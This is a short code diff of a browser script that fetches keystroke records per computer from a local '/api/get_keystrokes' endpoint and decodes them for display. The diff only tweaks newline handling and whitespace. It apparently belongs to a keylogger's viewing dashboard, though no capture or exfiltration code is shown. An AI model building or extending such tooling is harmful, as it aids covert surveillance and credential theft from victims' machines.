@@ -13,6 +13,7 @@ console.log("computer:::::::",computer)
 const h1 = document.getElementById("h1")
 h1.textContent = computer
 
+
 fetch(`http://127.0.0.1:5000/api/get_keystrokes?computer=${computer}`).then(
     response => response.json().then(
         dat => {
@@ -31,6 +32,8 @@ fetch(`http://127.0.0.1:5000/api/get_keystrokes?computer=${computer}`).then(
         }
     )
 )
+
+
 const deciphering = (text) => {
     let new_d = document.createElement("div")
     let new_p = document.createElement("p")
@@ -40,10 +43,14 @@ const deciphering = (text) => {
         if (char != undefined){
             decrypted += char
         }else{
+            if (text[i] == "\n"){
             new_p.textContent += decrypted
             new_d.appendChild(new_p)
             new_p = document.createElement("p")
             decrypted = ""
+            }else{
+                decrypted += text[i]
+            }
         }
     }
     console.log(decrypted)
